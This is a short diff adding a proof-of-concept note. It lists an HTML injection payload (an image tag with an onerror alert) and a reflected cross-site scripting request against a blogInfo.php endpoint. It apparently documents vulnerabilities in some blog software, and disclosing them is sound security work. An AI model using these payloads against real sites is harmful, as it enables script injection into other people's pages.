@@ -1,0 +1,9 @@
+HTML Injection:
+
+&lt;img src =. onerror = alert ()&gt;
+
+
+Cross Site Scripting:
+
+/include/ajax/blogInfo.php?asd=&lt;script&gt;alert(&#039;www.example.com&#039;)&lt;/script&gt;
+
